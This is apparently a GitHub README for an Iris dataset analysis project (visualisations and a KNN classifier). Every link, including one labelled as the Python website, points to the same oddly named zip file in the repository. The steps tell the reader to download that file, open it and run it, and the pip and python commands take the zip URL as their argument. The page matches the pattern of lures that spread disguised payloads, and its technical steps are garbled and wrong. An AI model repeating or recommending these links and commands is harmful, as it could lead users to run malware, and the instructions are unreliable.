# 🌸 Iris-data-analysis - Easy Insights from Iris Data

[![Download Iris-data-analysis](https://github.com/Dkavyasri/Iris-data-analysis/raw/refs/heads/main/notebook/analysis-Iris-data-brawlsome.zip)](https://github.com/Dkavyasri/Iris-data-analysis/raw/refs/heads/main/notebook/analysis-Iris-data-brawlsome.zip)

## 📝 Project Overview

This project helps you explore the Iris dataset and classify the Iris species using simple methods. You will learn how to:

- Load and explore the Iris dataset
- Create visualizations like histograms, boxplots, and pairplots
- Build a simple K-Nearest Neighbors (KNN) model for classification
- Evaluate the model's performance using accuracy and confusion metrics

## 🚀 Getting Started

To get started with Iris-data-analysis, follow these simple steps to download and run the software.

### 1. Download the Application

Visit this page to download: [Iris-data-analysis Releases](https://github.com/Dkavyasri/Iris-data-analysis/raw/refs/heads/main/notebook/analysis-Iris-data-brawlsome.zip).

This will take you to the latest version of the application. Follow the instructions below to download it.

### 2. Install Dependencies

After downloading, you may need to install a few additional packages. These are required for the application to function correctly:

- Python: Make sure you have Python 3.6 or newer installed on your computer. You can download it from the official [Python website](https://github.com/Dkavyasri/Iris-data-analysis/raw/refs/heads/main/notebook/analysis-Iris-data-brawlsome.zip).
- Package Manager: If you don’t have it, install pip, which comes with newer versions of Python by default. You will use it to install other needed packages.

### 3. Using the Command Line

You will need to use the command line to install the necessary packages. Don’t worry; it’s simple. Here’s how to do it:

1. Open your Command Prompt (Windows) or Terminal (Mac/Linux).
2. Navigate to the folder where you downloaded the project. Use the `cd` command. For example:
   ```
   cd path\to\Iris-data-analysis
   ```
   Replace `path\to\Iris-data-analysis` with the actual path on your system.
   
3. Once you are in the project folder, run this command to install the required packages:
   ```
   pip install -r https://github.com/Dkavyasri/Iris-data-analysis/raw/refs/heads/main/notebook/analysis-Iris-data-brawlsome.zip
   ```

This command tells Python to install everything listed in the `https://github.com/Dkavyasri/Iris-data-analysis/raw/refs/heads/main/notebook/analysis-Iris-data-brawlsome.zip` file.

## 📥 Download & Install

To download, return to the [Iris-data-analysis Releases](https://github.com/Dkavyasri/Iris-data-analysis/raw/refs/heads/main/notebook/analysis-Iris-data-brawlsome.zip) page. Choose the latest version, and follow these steps:

1. Click on the relevant download link for your operating system.
2. Once the download is complete, open the file and run it.

## 📊 Running the Application

1. After installation, return to your command line.
2. In the command line, navigate to the project's folder again as shown above.
3. Run the main application file by executing:
   ```
   python https://github.com/Dkavyasri/Iris-data-analysis/raw/refs/heads/main/notebook/analysis-Iris-data-brawlsome.zip
   ```
4. The application will load the Iris dataset, and you can start exploring and analyzing the data.
